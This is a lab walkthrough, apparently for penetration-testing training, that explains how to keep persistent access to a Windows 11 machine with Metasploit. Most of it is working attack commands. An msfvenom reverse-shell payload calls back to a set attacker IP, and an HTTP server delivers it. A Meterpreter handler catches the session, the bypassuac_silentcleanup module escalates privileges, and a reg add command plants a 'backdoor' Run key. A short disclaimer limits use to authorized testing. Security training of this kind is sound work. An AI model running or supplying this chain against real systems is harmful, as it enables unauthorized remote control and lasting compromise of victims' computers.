Persistence via Windows Registry Run Key (Meterpreter)

📌 Overview

This technique demonstrates how to establish persistence on a Windows 11 system by adding a malicious executable to the Windows Registry Run key, ensuring it executes every time the system starts.

⚠️ Disclaimer

This content is for educational and authorized penetration testing purposes only. Do not use these techniques on systems without proper permission.

🛠️ Lab Setup
Attacker Machine: Kali Linux
Target Machine: Windows 11
Tool: Metasploit Framework
🚀 Step-by-Step Execution


1. Generate Payload

Create a reverse shell payload using msfvenom:

  -> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.141 LPORT=4444 -f exe > reverse.exe


2. Transfer Payload to Target

Start a simple HTTP server on Kali:

  -> python3 -m http.server

On the Windows target, download the payload via browser:

   http://<attacker-ip>:8000/reverse.exe


3. Start Listener (Handler)

Launch Metasploit and configure the handler:

msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.141
set LPORT 4444
run


4. Execute Payload on Target

Run reverse.exe on the Windows machine.

✅ A Meterpreter session should be established.


5. Background the Session
getuid
background


6. Bypass UAC (Privilege Escalation)

Search and use the UAC bypass module:

search bypassuac_silentcleanup
use exploit/windows/local/bypassuac_silentcleanup
set SESSION 1
run

A new elevated session will be created.

Interact with it:

sessions -i 2


7. Add Persistence via Registry

Open a shell:

shell

Add registry entry:

reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /d "C:\Users\Administrator\Downloads\reverse.exe"

✅ This ensures the payload runs automatically at system startup.

8. Verify Persistence

Restart the target machine
Start listener again:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.141
set LPORT 4444
run
Once the system boots and the registry entry executes → Meterpreter session reconnects.
🎯 Result

Persistence is successfully established. The payload executes automatically on system startup, giving repeated access to the target machine.

🔐 Key Takeaways
Registry Run keys are a common persistence mechanism
UAC bypass is often required for HKLM modifications
Always verify persistence after reboot
